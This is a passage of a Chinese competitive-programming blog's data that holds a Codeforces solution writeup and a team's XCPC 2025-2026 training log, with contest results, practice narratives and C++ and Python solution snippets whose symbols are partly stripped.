$k$ 张牌等价，所以最后的答案为 \\dfrac{km(m + 1)^k}{2}","categories":["Solution"]},{"title":"题解：CF2107E Ain and Apple Tree","path":"/2025/05/07/CF2107E/","content":"首先考虑无解的情况。 当这棵树为一条链时，答案取到最大值。证明很简单，假设存在一个节点 $u$ 至少有 $2$ 个孩子节点，任取两个 $v_1,v_2$，则 $\\text{dep}(\\operatorname{LCA}(v_1,v_2)) = \\text{dep}(u)$，此时进行调整，将 $v_1$ 与 $v_2$ 改为直接相连，能够增大答案。即断开 $(u,v_2)$，连接 $(v_1,v_2)$，则有 $\\text{dep}(\\operatorname{LCA}(v_1,v_2)) = \\text{dep}(v_1) \\text{dep}(u)$。因此假设不成立，命题得证。 令 $f_i$ 表示 $n = i$ 时的形成链的答案，则有： f_n = \\sum _{i = 0}^{n - 1} i \\times (n - i - 1) = (n - 1)\\sum_{i = 0}^{n - 1}i - \\sum_{i = 0}^{n - 1} i^2\\\\ =\\frac{n(n - 1)^2}{2} - \\frac{n(n - 1)(2n - 1)}{6} = \\frac{n(n - 1)(n - 2)}{6}因此 $k ans + 1$ 时无解。 首先构造出 $i$ 与 $i + 1$ 连边所形成的链，之后考虑进行调整。初始时 $l = 1,r = n$，$[l,r]$ 形成主链。每次考虑将 $r - 1$ 与 $r$ 断边并将 $r$ 连至 $l$ 上。分析可知，对答案的减少量为 $(f_r - f_{r - 1}) - (f_{l + 1} - f_l) - (l - 1) (r - l - 1)$，化简可得 $\\dfrac{(r - 1)(r - 2) - l(l - 1)}{2} - (l - 1)(r - l - 1)$。若可以操作，则完成后 $r \\gets r - 1$，否则 $l \\gets l + 1$。重复调整操作直至符合条件。 接下去证明该调整操作的可行性。显然，在不断操作后，$l$ 与 $r$ 会不断趋近。当 $r - l = 2$ 时，消去 $r$ 并代入得，该操作对答案的减少量为 $\\frac{(l + 1)l - l(l - 1)}{2} - (l - 1)(l + 2 - l - 1) = 1$，而 $r - l = 1$ 时不会改变答案。能够改变答案的减少量为 $1$，因此当有解时，总是存在一种调整方案。 代码如下： #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline ll read ();int t,n;ll k;int main () t = read (); while (t--) n = read ();k = read (); vector vector int ve (n + 1); ll res = 1ll * n * (n - 1) * (n - 2) / 6; if (res + 1 k) puts (No);continue; puts (Yes); ll l = 1,r = n;res -= k; while (abs (res) 1) ll del = (1ll * (r - 1) * (r - 2) - 1ll * l * (l - 1)) / 2 - 1ll * (r - l - 1) * (l - 1); if (del = res) res -= del,ve[l].push_back (r--); else ++l; for (int u = 1;u = n;++u) for (auto v : ve[u]) printf (%d %d ,u,v); for (int i = 1;i r;++i) printf (%d %d ,i,i + 1); return 0;inline ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"2025-2026 XCPC","path":"/2025/05/02/XCPC2025-2026/","content":"基本信息本赛季由 组队，全靠大佬带飞~。 中文队名：正在验证该队是否是真人。 英文队名：Verifying we are human. 队友 Sky 的记录！被带飞！！！ 训练情况总览 $\\texttt{Id}$ $\\texttt{Date}$ $\\texttt{Title}$ $\\texttt{Solved}$ $\\texttt{Dirt}$ $\\texttt{Post-contest Solved}$ $1$ $2025.05.02$ The 2023 Guangdong Provincial Collegiate Programming Contest $8/13$ $55\\%$ $10/13$ $2$ $2025.05.15$ The 2024 ICPC Asia Hangzhou Regional Contest $6/13$ $62\\%$ $6/13$ $3$ $2025.05.19$ The 2025 ICPC Wuhan Invitational Contest $5/13$ $69\\%$ $7/13$ $4$ $2025.05.21$ The 2025 ICPC China Zhejiang Province Programming Contest $6/13$ $76\\%$ $7/13$ $5$ $2025.05.22$ The 2024 ICPC Asia Shanghai Regional Contest $5/13$ $73\\%$ $7/13$ $6$ $2025.05.25$ The 2024 CCPC Jinan Site $4/13$ $50\\%$ $7/13$ $7$ $2025.05.26$ The 2024 ICPC Southeastern Europe Regional Contest $7/13$ $41\\%$ $8/13$ $8$ $2025.05.27$ The 2024 ICPC Central Europe Regional Contest $5/12$ $28\\%$ $6/12$ $9$ $2025.05.29$ The 2023 ICPC Asia Jinan Regional Contest $6/13$ $14\\%$ $7/13$ $10$ $2025.05.30$ The 2023 CCPC Guilin Site $4/13$ $60\\%$ $7/13$ $11$ $2025.06.02$ The 2025 Guangdong Provincial Collegiate Programming Contest $5/13$ $62\\%$ $8/13$ $12$ $2025.07.15$ 2025牛客暑期多校训练营1 $4/12$ $33\\%$ $6/12$ $13$ $2025.07.17$ 2025牛客暑期多校训练营2 $7/13$ $59\\%$ $7/13$ $14$ $2025.07.22$ 2025牛客暑期多校训练营3 $7/13$ $42\\%$ $7/13$ $15$ $2025.07.24$ 2025牛客暑期多校训练营4 $4/13$ $50\\%$ $8/13$ $16$ $2025.07.29$ 2025牛客暑期多校训练营5 $4/13$ $43\\%$ $6/13$ $17$ $2025.07.31$ 2025牛客暑期多校训练营6 $5/13$ $29\\%$ $8/13$ $18$ $2025.08.05$ 2025牛客暑期多校训练营7 $5/10$ $64\\%$ $5/10$ $19$ $2025.08.07$ 2025牛客暑期多校训练营8 $5/11$ $38\\%$ $6/11$ $20$ $2025.08.12$ 2025牛客暑期多校训练营9 $5/13$ $55\\%$ $6/12$ $21$ $2025.08.14$ 2025牛客暑期多校训练营10 $5/12$ $38\\%$ $7/12$ $22$ $2025.08.30$ The 2023 CCPC Harbin Site $6/13$ $33\\%$ $6/13$ $23$ $2025.08.31$ The 2023 CCPC Qinghuangdao Site $5/13$ $44\\%$ $6/13$ $24$ $2025.09.05$ The 15th Shandong Provincial Collegiate Programming Contest $7/13$ $50\\%$ $7/13$ $25$ $2025.09.07$ The 2025 ICPC Asia East Continent Online Contest (I) $6/13$ $14\\%$ $8/13$ $26$ $2025.09.14$ The 2025 ICPC Asia East Continent Online Contest (II) $4/12$ $33\\%$ $8/12$ $27$ $2025.09.20$ The 2025 CCPC Online Contest $6/13$ $45\\%$ $8/13$ $28$ $2025.09.11$ The 2023 ICPC Asia Hefei Regional Contest $4/12$ $71\\%$ $5/12$ $29$ $2025.09.25$ The 2021 ICPC Southeastern European Regional Programming Contest $8/14$ $42\\%$ $9/14$ $30$ $2025.10.02$ The 2022 ICPC Asia Hong Kong Regional Contest $6/12$ $57\\%$ $9/12$ $31$ $2025.10.09$ The 2024 ICPC Asia Hong Kong Regional Contest $5/13$ $54\\%$ $6/13$ $32$ $2025.10.13$ The 2018 ICPC Asia Qingdao Regional Contest $7/13$ $12\\%$ $8/13$ $33$ $2025.10.17$ The 2024 ICPC Asia Shenyang Regional Contest $3/13$ $50\\%$ $6/13$ $34$ $2025.10.19$ The 2024 Shandong Provincial Collegiate Programming Contest $8/13$ $38\\%$ $9/13$ $35$ $2025.10.23$ The 2025 ICPC Asia Xi’an Regional Contest $5/13$ $44\\%$ $8/13$ $36$ $2025.10.26$ The 2025 ICPC Asia Chengdu Regional Contest $6/13$ $33\\%$ $9/13$ $37$ $2025.11.02$ The 2025 ICPC Asia Wuhan Regional Contest $5/13$ $37\\%$ $7/13$ $38$ $2025.11.05$ The 2022 ICPC Asia Nanjing Regional Contest $7/13$ $46\\%$ $7/13$ $39$ $2025.11.09$ The 2025 ICPC Asia Nanjing Regional Contest $4/13$ $42\\%$ $7/13$ $40$ $2025.11.23$ The 2025 ICPC Asia Shenyang Regional Contest $4/13$ $33\\%$ $7/13$ $41$ $2025.11.30$ The 2025 CCPC Chongqing Site $4/13$ $20\\%$ $4/13$ $42$ $2025.12.20$ The 2025 ICPC Asia Taichung Regional Programming Contest $8/14$ $27\\%$ $10/14$ $43$ $2026.01.02$ The 2025 ICPC North America East Central Regional Contest (ECNA 2025) $8/12$ $50\\%$ $10/12$ $44$ $2026.01.07$ The 2021 ICPC Asia East Continent Final Contest (EC-Final 2021) $6/13$ $54\\%$ $9/13$ $45$ $2026.01.09$ The 2022 ICPC Asia East Continent Final Contest (EC-Final 2022) $4/13$ $43\\%$ $8/13$ $46$ $2026.01.11$ The 2024 ICPC Europe Championship $5/11$ $64\\%$ $8/11$ $47$ $2026.01.14$ The 2024 ICPC North America Championship $7/13$ $50\\%$ $9/13$ $48$ $2026.01.18$ The 2025 ICPC Europe Championship $4/11$ $42\\%$ $6/11$ $49$ $2026.01.21$ The 2023 ICPC Asia East Continent Final Contest (EC-Final 2023) $5/13$ $0\\%$ $7/13$ $50$ $2026.01.25$ The 2024 ICPC Asia East Continent Final Contest (EC-Final 2024) $3/12$ $70\\%$ $7/12$ 训练记录省赛备战2025.05.02 The 2023 Guangdong Provincial Collegiate Programming Contest备战省赛，也是组队后的第一次训练。 这一场签到题比较多，一小时以内按顺序过了 A,I,C,D,K。接下来我和 Sky 讨论了一下 M 的做法，确定了 $O(n^2)$ 的 DP 维护直径，其间 Zlw 一眼 B 板子题，在 1.5h 一发通过了该题。 之后我和 Zlw 尝试口胡 E,F，没错他基本口胡出来了，大力模板。Sky 提交 M 题 RE，我去瞅了眼，发现三点共线导致分母为 $0$，立马帮他改成了叉积写法。之后又 WA，看了半天发现是 INF 开的不够大，红温……好在 3.5h 内通过。 然后我开始写 E 的字典树，写了半天发现巨丑还会运行错误，果断叫上 Zlw 来写，在提交了几发后发现神秘错误，在封榜后通过。之后就是 F，和队友确定了线段树二分写法，但是似乎和他的码风不太一样，于是被踹下来。但是由于写得有点屎，赛时没过，知道赛后 40 min 后通过该题。 最后赛时 $8$ 题收尾（主要由 Zlw 写了一大半的题 orzorzorz，以及 Sky 的难题攻克）！ F 题有点深刻，自己又写了一遍。终于琢磨出为什么赛时会有这么多队伍过，原来还有两支 $\\log$ 的弱智写法。还是写一下线段树二分的做法吧，借鉴了一下题解，时间复杂度 $O(\\sum k \\log n)$。 #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 4e6 + 50;const int MOD = 1e9 + 7;inline int read ();int t,n,q,cnt,ls[MAX],rs[MAX],tree[MAX];class BIT int n;vector ll c; int lowbit (int x) return x (-x); public : BIT (int n) : n (n),c (n + 1,0) void modify (int x,int v) for (int i = x;i = n;i += lowbit (i)) c[i] += v; ll query (int x) ll res = 0;for (int i = x;i;i -= lowbit (i)) res += c[i];return res;;void modify (int cur,int l,int r,int x,int v) if (!cur) cur = ++cnt,ls[cur] = rs[cur] = tree[cur] = 0; tree[cur] += v; if (l == r) return ; int mid = (l + r) 1; if (x = mid) modify (ls[cur],l,mid,x,v); else modify (rs[cur],mid + 1,r,x,v);int calc (vector int cur) int res = 0; for (auto v : cur) res += tree[v]; return res;vector int next_L (vector int cur) for (auto v : cur) v = ls[v]; return cur;vector int next_R (vector int cur) for (auto v : cur) v = rs[v]; return cur;int search_L (vector int cur,int l,int r,int pos) if (calc (cur) == r - l + 1) return 0; if (l == r) return l; int mid = (l + r) 1; if (pos = mid) return search_L (next_L (cur),l,mid,pos); else int res = search_L (next_R (cur),mid + 1,r,pos); if (!res) return search_L (next_L (cur),l,mid,pos); else return res; int search_R (vector int cur,int l,int r,int pos) if (calc (cur) == r - l + 1) return n + 1; if (l == r) return l; int mid = (l + r) 1; if (pos mid) return search_R (next_R (cur),mid + 1,r,pos); else int res = search_R (next_L (cur),l,mid,pos); if (res == n + 1) return search_R (next_R (cur),mid + 1,r,pos); else return res; int main () t = read (); while (t--) n = read ();q = read ();cnt = 0; vector int val (n + 1),col (n + 1),rt (n + 1,0); BIT tr (n); for (int i = 1;i = n;++i) col[i] = read (),modify (rt[col[i]],1,n,i,1); for (int i = 1;i = n;++i) val[i] = read (),tr.modify (i,val[i]); while (q--) int ty = read (); if (ty == 1) int p = read (),x = read (); modify (rt[col[p]],1,n,p,-1); col[p] = x; modify (rt[col[p]],1,n,p,1); else if (ty == 2) int p = read (),v = read (); tr.modify (p,v - val[p]); val[p] = v; else int st = read (),k = read (); vector int p; for (int i = 1;i = k;++i) int x = read (); p.push_back (rt[x]); int l = search_L (p,1,n,st),r = search_R (p,1,n,st); printf (%lld ,tr.query (r - 1) - tr.query (l + 1 - 1)); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f; 2025.05.15 The 2024 ICPC Asia Hangzhou Regional Contest上午考完期末，开启暑假生活！ 省流：$6$ 题收尾。过题顺序 A,K,E,H,M,F。 可能是上午考线代考傻了，签到题写了半小时才过。$A$ 用并查集维护即可，可是一开始写得有点乱，WA 了 $2$ 次才过。接着队友写 K，不知道怎么回事思路没问题就是过不了。我听完思路直接给他重写了，然后就过了，非常神奇（说明队友码力有点弱，需要加训~）。 接着 Zlw 佬开始敲 B，敲完交了以后才发现把题目理解成了或运算，于是乎，一直只能想到双 log 的做法。我这边看了下 E，一开始认为是 DP，想了一会儿发现更像是贪心。和 Zlw 佬进一步讨论了一下感觉没啥问题。设当前处在 $f$ 层，找到 $l$ 在 $f$ 之下的 $r$ 最大的那个，如果不存在，就需要花费额外的能量向上运动。等到达最顶端后在往下降，处理一下剩余的区间，此时不需要额外花费。因此直接可以优先队列维护，从而做到 $O(n \\log n)$。 Sky 这时候在写 M，写完以后发现题目看错，占了一会儿机时。趁着他在调的时候继续口胡下一题，是我最喜欢的构造！不难想到先取最长的链，设长度为 $k$，于是剩下 $[1,k - 1]$ 的区间全部能够挂在这条链上。唯一需要考虑的就是有多条长度为 $k$ 的链的情况，此时只要前面的区间没有都挂在根节点上就存在解。 M 还有一些问题，于是我把 E,H 这两题都实现了。接下去他俩一起在搞 M，我开始看 F。M 似乎进行数论分析和 ST 维护以后终于过了。F 是图论，容易想到 scc 缩点，难点是处理询问。不过询问又非常特殊，是在一条链上询问，因此就可以通过前缀和处理。但需要注意块内可能询问点并不完整，因此需要更多的处理。突然开窍，然后在比赛结束前 3 分钟通过了！ for (int i = 1;i = n;++i) ++sz[scc[i]];for (int i = 1;i = k;++i)for (int j = 1;j = n;++j) pre[i][j] = pre[i][j - 1]; if (scc[a[i][j]] != scc[a[i][j - 1]]) tot[i][j] = 1; else pre[i][j] += tot[i][j - 1],tot[i][j] = tot[i][j - 1] + 1;while (q--) ll id = read (),l = read (),r = read (); id = (id + ans) % k + 1;l = (l + ans) % n + 1,r = (r + ans) % n + 1; if (scc[a[id][l]] == scc[a[id][r]]) ans = pre[id][r] - pre[id][l - 1] - (tot[id][l] - 1) * (r - l + 1); else ans = pre[id][r] - pre[id][l - 1] - (sz[scc[a[id][l]]] - (tot[id][l] - 1)) * (tot[id][l] - 1); printf (%lld ,ans); 总的来说，这场 6 题还是很不错的（似乎能银）。但是罚时过高，速度还是有点慢。看来，还是需要加训滴~ 2025.05.16我开始进一步学习计算几何，争取在省赛前能把这一块的模板弄全。具体内容就放在上面的博客里了。 2025.05.18自己打了把西安交通大学2025年程序设计竞赛校赛（同步赛），被 F 题硬控了，最后八题收尾。 2025.05.19 The 2025 ICPC Wuhan Invitational ContestA 签到，I 简单构造，I 无解判断写错 WA 了一发（阿巴阿巴）。 L 算是贪心，容易想到枚举端点位置，但是发现固定最大最小值后中位数位置不确定，于是改为枚举最小值和中位数。队友调了老半天才通过。 F 似乎题解是贪心，但是 Zlw 用背包配合 __int128 通过了，取模没取完整贡献一发罚时。 G 感觉有点典，容易想出把所有颜色分开考虑。这种棋盘就方案数有两种 DP，简单的就直接 $O(nm)$ 遍历；复杂的依赖一种颜色的数量 $O(k)$，进行 DP 容斥（CF559C）即可。于是想到分块做法，时间复杂度 $O(mn \\sqrt {mn})$。 M 超绝计算几何，一直调到最后。大致分为两类，到端点的距离以及与原点和垂足形成的直线到线段的交点的距离。设端点是 $\\text{S},\\text{T}$，首先做平面 $\\text{OST}$，做垂足 $F$，若落在直线 $\\text{OS},\\text{OT}$ 的那个区域之外，则只需要考虑前一种情况即可，否则两种情况都要考虑。其次需要考虑 $\\mid\\text{OF}\\mid$ 已知时 $\\mathbf{OF}$ 的方向性。最后，需要尤其注意一下精度和垂直的情况。我们写的时候 acos(x) 的参数由于精度问题落在了 $[-1,1]$ 之外，然后一直输出 nan，非常令人红温。不过在查看数据并 WA 无数次后终于通过了此题。 2025.05.21 The 2025 ICPC China Zhejiang Province Programming Contest超多罚时场。 B,I 签到，然后我发现 D 是简单构造，三题一遍过，开局还算比较顺利。 接下去开了 L，由奶龙指认的奶龙一定不是奶龙为出发点，提出拓扑加贪心的算法。我开写，脑抽用 set 来维护最优作为奶龙的节点，可是似乎处理上有很大的细节漏洞，于是一直 WAWAWA，导致接下去的一个半小时没有过题。Zlw 和 Sky 在想 F，讨论出了拆点加 bfs 最短路的做法。被踹下去以后他们提交了三发后通过（WA 是 bfs 后忘记 push 新的节点了）。 这时候我在重构了若干次代码之后突然醒悟，只需要 $O(n)$ 的拓扑排序即可实现。先处理链，遇到一个点标记为奶龙，指向的下一个点标记为非奶龙，然后再把下一个的下一个点入度减一。剩下为环的部分，如果未标记就记录个数 $x$，一段未标记中奶龙的个数就是 $\\frac{x}{2}$。再次重写，终于通过。【果然，写奶龙题人也会变唐，阿巴阿巴~~~】 Zlw 在之后尝试 A，作为一个数据结构大神，尝试用分块，莫队以及线段树的结合题切题。Sky 在看 G，我看 M。A 上机尝试并通过样例后提交，发现 TLE，调整分块参数后仍然无法通过。而 M 发现交互毫无意义，把题目转化为了已知与一顶点 $P$ 到其它不相邻的顶点构成的线段相交的三角剖分数量，然后还原三角剖分。可惜没什么想法。 G 又想了贪心的想法，于是上机写。由于普通的贪心是 $O(Tnk)$ 的，我微微打表观察以后提出了一个先将每个数增加 $\\max (0,\\frac{k - 100n}{n})$ 后剩余部分再贪心的做法（其实严格来说，$100$ 应该替换为 $\\max {l_i} - \\min {l_i}$，但是取极限差不多就是 $100$），此时经过估算应该能够通过。可是交上去后仍然 TLE，于是接下去的 n 发提交都是再尝试调参卡精度。Sky 弄了半天仍然不行，趁他上厕所的时候，我把他贪心改成优先队列，然后加了快读快写，把常数减小了 $5$ 倍左右。终于，+10 以 956 ms 极限卡过此题（一共 113 个测试点可还行 qwq）。后来看了题解，发现是要二分操作的倍率，实在是深刻。 还是 6 题首尾，不知道什么时候可以突破捏~ 2025.05.22 The 2024 ICPC Asia Shanghai Regional Contest又难又屎的一场，赛时 5 题，赛后 7 题。 上来就被 I 签到给恶心了好几发，原因就是求的是最大值的模而非模意义下的最大值，因此取模要非常小心。$0$ 以及大于模数的情况都需要考虑到，非常容易出错。半小时才通过此题，而且 WA 了整整 7 次（显然是红温了）。 接下来 Sky 秒了博弈论 C，Zlw 开始写 B。但由于一些答案的合并问题，B 一直被硬控。接下来发现 D 是构造，果断将其丢给我。我手玩 D 发现只需要着重考虑最后四位的情况，于是疯狂分讨。上机写 D，发现样例水得一批，于是直接交，喜提 WA。下机思考，Zlw 终于过了 B，然后我发现有几种情况能够更优的构造，果断修改后通过。这时候 2 小时 4 题，除了罚时外到还行。 之后我又发现 H 是构造，于是又开始手玩。他俩在想 G，似乎是和二分中位数相关。H 玩了很久，由于是最优化步数的构造，我似乎没啥完整的想法，于是开始进击 M 计算几何。 M 似乎好做，很快地将问题分为了四类。设非上下表面的点的个数为 $n$（需要去重），然后将上下表面的点映射到二维平面中。于是有： $n = 0$ 恒有解。 $n = 1$ 判断是否存在一条过定点的直线可以将剩余点归到直线的一侧。直接判断该点是否为凸包上的一点即可。 $n = 2$ 判断过两个定点的圆能够将使得剩余点均在这个圆中。将点分为直线的两侧，然后根据圆周角的大小，一侧各剩下一点（没有的话肯定合法），判断四点共圆即可。特别地，如果点在直线上，则需要在线段上才符合。 $n = 3$ 三点共线则不合法。否则取三点作圆，判断剩余点是否在圆上即可。 想完的时候 Zlw 刚好写完 G，于是我上机贺板子写 M。写完以后一直 WA，各种 corner 写挂，最后又被卡精度，直接写崩溃，直到结束也没过。赛后调了很久很久，然后又不断 hack 自己，最终才诞生了一份稍微好一点的屎。 auto f1 = [] () - bool sp.push_back (P[0]); auto hull = convex_hull (sp); for (auto [x,y] : hull) if (dcmp (x - P[0].x) == 0 dcmp (y - P[0].y) == 0) return true; return false;;auto f2 = [] () - bool for (auto x : sp) if (on_line (x,P[0],P[1]) !on_seg (x,P[0],P[1])) return false; LD d1 = 1000,d2 = 1000; Point P1,P2; for (auto x : sp) if (on_line (x,P[0],P[1])) continue; if (cross (P[1] - P[0],x - P[0]) 0) if (angle (x - P[1],x - P[0]) d1) P1 = x,d1 = angle (x - P[1],x - P[0]); if (cross (P[1] - P[0],x - P[0]) 0) if (angle (x - P[1],x - P[0]) d2) P2 = x,d2 = angle (x - P[1],x - P[0]); if (d1 == 1000 || d2 == 1000) return true; Point F1 = foot (P1,P[0],P[1]),F2 = foot (P2,P[0],P[1]); if (dcmp (dot (F1 - P[0],F1 - P[1])) 0 dcmp (dot (F2 - P[0],F2 - P[1])) 0) return false; Circle C1 = triangle_circum (P[0],P[1],P1),C2 = triangle_circum (P[0],P[1],P2); return in_cir (C1,P2) in_cir (C2,P1);;auto f3 = [] () - bool if (dcmp (cross (P[0] - P[1],P[0] - P[2])) == 0) return false; Circle C = triangle_circum (P[0],P[1],P[2]); for (int i = 3;i P.size ();++i) if (dcmp (len (P[i] - C.O) - C.r) != 0) return false; for (auto x : sp) if (!in_cir (C,x)) return false; return 1;; 事实证明，还是要谨慎开计算几何。赛后发现我精准的选到了 H,M $\\text{Medium hard}$，而跳过了中间的 F,J（非常离谱，看都没看）。看来策略还是需要在接下去进一步调整！ 2025.05.23补题，发现 H 最后构造出来剩余 . 的个数不会超过四个。于是就开始贪心构造，调整 6 种情况的优先级，试着试着突然发现对了。唯一的坑点就是要小心同色连成连通块，直接暴力判断后调整。放一下屎山代码： int main () n = read ();int ans = 0; vector vector char a (n + 5,vector char (n + 5,.)); vector vector char b (n + 5,vector char (n + 5,.)); auto check = [] (int x,int y) - bool return !(x y || x = 0 || y = 0 || x n || a[x][y] != .);; auto same = [] (char ch,int x,int y) - bool return ch == a[x][y - 1] || ch == a[x][y + 1] || ch == a[x - 1][y - 1] || ch == a[x - 1][y] || ch == a[x + 1][y] || ch == a[x + 1][y + 1];; for (int i = n;i;--i) for (int j = 1;j = i;++j) if (i == n j == 1) continue; if (check (i,j) check (i,j + 1) check (i - 1,j - 1)) while (same (char (op + A),i,j) || same (char (op + A),i,j + 1) || same (char (op + A),i - 1,j - 1)) ++op,op %= 26; a[i][j] = a[i][j + 1] = a[i - 1][j - 1] = char (op + A); ++ans;continue; if (check (i,j) check (i,j + 1) check (i - 1,j + 1)) while (same (char (op + A),i,j) || same (char (op + A),i,j + 1) || same (char (op + A),i - 1,j + 1)) ++op,op %= 26; a[i][j] = a[i][j + 1] = a[i - 1][j + 1] = char (op + A); ++ans;continue; if (check (i - 1,j - 2) check (i - 1,j - 1) check (i,j)) while (same (char (op + A),i - 1,j - 2) || same (char (op + A),i - 1,j + 1) || same (char (op + A),i,j)) ++op,op %= 26; a[i - 1][j - 2] = a[i - 1][j - 1] = a[i][j] = char (op + A); ++ans;continue; if (check (i,j) check (i - 1,j - 1) check (i - 2,j - 1)) while (same (char (op + A),i,j) || same (char (op + A),i - 1,j - 1) || same (char (op + A),i - 2,j - 1)) ++op,op %= 26; a[i][j] = a[i - 1][j - 1] = a[i - 2][j - 1] = char (op + A); ++ans;continue; if (check (i,j) check (i - 1,j) check (i - 1,j + 1)) while (same (char (op + A),i,j) || same (char (op + A),i - 1,j) || same (char (op + A),i - 1,j + 1)) ++op,op %= 26; a[i - 1][j] = a[i - 1][j + 1] = a[i][j] = char (op + A); ++ans;continue; if (check (i - 1,j) check (i,j) check (i - 2,j - 1)) while (same (char (op + A),i,j) || same (char (op + A),i - 1,j) || same (char (op + A),i - 2,j - 1)) ++op,op %= 26; a[i - 1][j] = a[i][j] = a[i - 2][j - 1] = char (op + A); ++ans;continue; for (int i = 1;i = n;++i) for (int j = 1;j = n - i;++j) putchar ( ); for (int j = 1;j = i;++j) putchar (a[i][j]); putchar (j == i ? : ); return 0; 2025.05.24仍然是调整日。昨天看其它队伍 vp 的时候发现自己的数论实在是太差了，遂补一下 exgcd。 Step 求满足 $\\forall i \\in [1,n],\\frac{n(n + 1)}{2} \\equiv 0\\pmod {p_i}$ 的最小正整数 $n$。 设 $l = 2\\times \\operatorname{lcm} (p_1,p_2,\\cdots,p_n)$。转换为最小化 $n$，使得 $n(n + 1) \\equiv 0 \\pmod l$ 成立。 由于 $\\gcd (n,n + 1) = 1$，因此 $l$ 的一种因子只会分给 $n$ 或 $n + 1$ 其中一个。由于 $l$ 的因子数量最多为 $15$ 个，因此状压枚举即可。 对于当前状态 $st$，令 $x = \\mathop{\\prod}_{\\substack{i \\in st}} p_i,y = \\mathop{\\prod}_{\\substack{j \\in st^\\complement}} p_j$，则 $n = ax,n + 1 = by$，作差可知 $-ax + by = 1$。由于 $\\gcd (a,b) = 1$，方程有解，直接跑 exgcd，然后求 $\\min \\{ax\\}$ 即可。 有限小数 终于把上个赛季重庆站的题目给补了。(以下证明部分参考 CCPC2024 重庆_补题记录ADFGH) 命题 若 $b = w2^x5^y$，则最优条件下 $d$ 一定可以表示为 $w2^{x\\prime}5^{y\\prime}$(其中 $w,z$ 不再含有 $2,5$ 的幂次)。 证明 设 $d = z2^{x\\prime}5^{y\\prime}$，则 $\\frac{a}{b} + \\frac{c}{d} = \\frac{az2^{x\\prime}5^{y\\prime} + wc2^x5^y}{wz2^{x + x\\prime}5^{y + y\\prime}}$。接下来处理分子，由于最后是有限小数，一定存在 $k$ 使得 $az2^{x\\prime}5^{y\\prime} + wc2^x5^y = kwz$ 成立。 把 $c,k$ 看作未知数，写成 exgcd 的标准形式： (-w2^x5^y) \\times c + wz \\times k = az2^{x\\prime}5^{y\\prime}有解当且仅当 $\\gcd(-w2^x5^y,wz) = w \\mid az2^{x\\prime}5^{y\\prime}$，也就是 $w \\mid az$。由于 $\\gcd (a,b) = 1$，则 $\\gcd (a,w) = 1$，因此得到 $w \\mid z$。 同理，把 $a,k$ 当作未知数，可以得到 $z \\mid w$。 综上，$z = w$ 成立。 因此，$\\frac{a}{b} + \\frac{c}{d} = \\frac{a2^{x\\prime}5^{y\\prime} + c2^x5^y}{w2^{x + x\\prime}5^{y + y\\prime}}$。由于最后是有限小数，所以可以进一步把和表示为 $\\frac{kw}{w2^{x + x\\prime}5^{y + y\\prime}} = \\frac{kw^2}{bd}$。枚举 $d$ 中的 $x^{\\prime},y^{\\prime}$，然后求不定方程 b \\times c - w^2 \\times k = -ad直接 exgcd 后求出 $c$ 的最小值即可。 2025.05.25 第十届中国大学生程序设计竞赛 济南站（CCPC 2024 Jinan Site）题目好难，就做出 4 题，倒闭！ A,J 签到，但是 A 被我 WA 了一发。之后想 F，Zlw 用了数论做法，还用到了莫比乌斯反演，似乎复杂化了，WA 了好几次以后才过（应该已经是 2.5 h 左右了）。 我看了 E，感觉是个超级分类讨论题，于是开始疯狂推公式。Sky 看 B，是个模拟+暴力题，但是不好写。E 我分了 7 类，感觉差不多了就上机写。由于涉及高精度，于是果断使用 Python。样例真的水的一批，过了样例交然后喜提 WA。 静态调试无果，于是下机看 I 换换脑子，Sky 上机写 B。I 构造容易想到自底往上，同一个子树内的点可以直接合并，然后想到链的做法不太好搞。这时候 Sky 过了 B，于是我就没再细想，把题丢给他俩，然后调 E 去了。 事实证明，这是这场比赛的败笔。接下来的时间内，E 一直被形如 ABAB...A 需要对最后一个 A 调整的 case 所困扰，而他俩直接把 I 想复杂，在做树上 DP。于是一直红温到比赛结束。 后来才发现，E 的 ABAB...A 的调整还需要细化。假设直接按照这个方案会浪费掉 $x$ 的距离，则有： B 最多可以移掉 $\\min (x,\\lfloor\\frac{D}{X + Y}\\rfloor \\times Y)$。 变为 AA...ABAB 的形式 B 最多有 $\\min (D - \\lfloor\\frac{D}{X}\\rfloor \\times X,\\lfloor\\frac{D}{X}\\rfloor \\times Y)$。 最终代码： def up (x,y) : return (x - 1) // y + 1def solve (A,B,C,X,Y,D) : if D = X : return A if D = X + Y : return min (A + B * (D - X),A * up (D,X),A * (D // X) + B * (D % X)) ans = A * up (D,X) #AA...A if D % X = Y : ans = min (ans,(D // X) * A + B * (D % X)) #AA...B else : ans = min (ans,(D // X) * A + B * Y + (D % X - Y) * C) #AA...BC ans = min (ans,A + B * Y + (D - X - Y) * C) #ABC if D % (X + Y) X : ans = min (ans,(D // (X + Y)) * (A + B * Y) + A + B * (D % (X + Y) - X)) #ABAB...AB ans = min (ans,D // X * A + min (D - D // X * X,D // X * Y) * B + (D - D // X * X - min (D - D // X * X,D // X * Y)) * C) # AA..ABAB.. ans = min (ans,(D // (X + Y)) * (A + B * Y) + A - B * min (D // (X + Y) * Y,X - D % (X + Y))) #ABAB...A ans = min (ans,(D // (X + Y)) * (A + B * Y) + C * (D - (X + Y) * (D // (X + Y)))) #ABAB...C return ans 而 I，那种链的情况也很好做，直接记录下剩余的点然后往上传即可。注意如果一个子树内，优先合并单点，再合并向上传过的点（因为单点不能形成自环）。赛后 Sky 写了 I，一发通过；我也在发现 corner case 以后 WA 了几发后通过。简直破大防！ C 纯构造竟然没发现，感觉非常好做。POP n GOTO n + 1; PUSH n GOTO n 就能形成链，POP n GOTO n + 1; PUSH n GOTO 1 就能翻倍，于是这道题做完了。 void dfs (ll x) if (!x) return ; if (x / 2 % 2 == 1) dfs (x / 2 - 1);++cnt; printf (POP %d GOTO %d; PUSH %d GOTO %d 